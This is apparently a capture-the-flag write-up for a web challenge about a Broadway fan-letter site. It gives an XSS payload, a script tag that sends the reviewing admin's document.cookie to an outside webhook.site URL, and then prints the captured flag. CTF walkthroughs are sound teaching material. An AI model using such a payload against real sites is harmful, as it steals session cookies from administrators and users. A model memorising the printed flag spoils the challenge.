# Challenge description

Welcome to the glitzy world of Broadway! The hit revival of "Sunset Boulevard" starring Nicole Scherzinger has taken the theater world by storm. As part of the fan engagement team, you've discovered a website where fans can send letters to the star. However, rumors suggest that a hidden admin dashboard contains something valuable - possibly the CTF flag.

# Soluce

When we open the website, we can see a form to send a letter. The website said that an admin will review the letter. We can try to send a letter with an xss injection to get the admin cookie.

```html
<script>
fetch("https://webhook.site/2b96145b-5a94-4c8c-a2b5-ef09464a175d?c=" + document.cookie);
</script>
```

Then we can see the cookie in the webhook: `swampCTF{THIS_MUSICAL_WAS_REVOLUTIONARY_BUT_ALSO_KIND_OF_A_SNOOZE_FEST}`.

So the flag is `swampCTF{THIS_MUSICAL_WAS_REVOLUTIONARY_BUT_ALSO_KIND_OF_A_SNOOZE_FEST}`.